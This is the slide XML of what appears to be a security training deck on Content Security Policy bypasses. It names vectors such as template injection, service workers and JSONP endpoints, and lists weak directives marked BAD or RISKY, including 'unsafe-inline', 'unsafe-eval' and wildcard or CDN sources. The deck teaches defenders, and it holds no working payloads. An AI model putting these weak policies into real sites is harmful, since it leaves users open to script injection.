      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4051697" y="1918097"/>
            <a:ext cx="3598188" cy="604361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2815"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4180284" y="2046684"/>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AngularJS/React</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4180284" y="2257782"/>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template injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="2579132"/>
            <a:ext cx="3598188" cy="604361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2815"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525423" y="270771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Service Workers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525423" y="2918817"/>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and Web Workers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4051697" y="2579132"/>
            <a:ext cx="3598188" cy="604361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2815"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4180284" y="270771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Browser bugs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4180284" y="2918817"/>
            <a:ext cx="334101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or parsing inconsistencies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="3268504"/>
            <a:ext cx="3822621"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Why CSP Bypasses Are Dangerous</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="25" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="3637002"/>
            <a:ext cx="7253049" cy="4104442"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4934180" y="4151908"/>
            <a:ext cx="1658444" cy="207306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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False Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4934180" y="4418180"/>
            <a:ext cx="2542948" cy="124384"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Strong CSP creates false sense of safety.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2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88078" y="4151447"/>
            <a:ext cx="221126" cy="221126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2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58362" y="4962242"/>
            <a:ext cx="221126" cy="221126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1453980" y="4961666"/>
            <a:ext cx="1658444" cy="207305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">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Developer Reliance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="569476" y="5227939"/>
            <a:ext cx="2542948" cy="124384"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Teams depend on CSP as sole defense.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4934180" y="5773498"/>
            <a:ext cx="1658444" cy="207305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Validation Neglect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4934180" y="6039770"/>
            <a:ext cx="2542948" cy="124384"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Input sanitization and checks are skipped.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="34"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88078" y="5773037"/>
            <a:ext cx="221126" cy="221126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1455132" y="6584293"/>
            <a:ext cx="1658445" cy="207305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">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CSP Bypass Found</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="570628" y="6850566"/>
            <a:ext cx="2542948" cy="248767"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker exploits misconfiguration or whitelists.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="37"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58362" y="6583833"/>
            <a:ext cx="221126" cy="221126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396835" y="7805142"/>
            <a:ext cx="7253049"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latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Organizations that depend solely on CSP without proper input validation create a critical vulnerability when bypasses are discovered.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6642" y="700445"/>
            <a:ext cx="6981825" cy="675680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Common CSP Weaknesses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="600908" y="1685211"/>
            <a:ext cx="6606302" cy="5843945"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 555"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="817007" y="1891308"/>
            <a:ext cx="5353407" cy="540544"/>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MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Overly Permissive Policies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="817007" y="2637949"/>
            <a:ext cx="6174105" cy="337780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>These configurations defeat the purpose of CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="817007" y="3161109"/>
            <a:ext cx="6174105" cy="1351425"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> BAD: script-src *</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> BAD: script-src 'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> BAD: script-src 'unsafe-eval'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> BAD: script-src https:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="1891308"/>
            <a:ext cx="4609862" cy="540544"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Specific Vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="2514243"/>
            <a:ext cx="3243143" cy="405408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Whitelisted CDNs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="3125748"/>
            <a:ext cx="6294834" cy="337780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>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2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> RISKY: script-src 'self' https://cdnjs.cloudflare.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="3648908"/>
            <a:ext cx="6294834" cy="337780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker can load any script from the CDN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="4192786"/>
            <a:ext cx="3243143" cy="405408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>JSONP Endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="4588497"/>
            <a:ext cx="6294834" cy="337780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>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2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> VULNERABLE: script-src 'self' https://api.example.com</a:t>
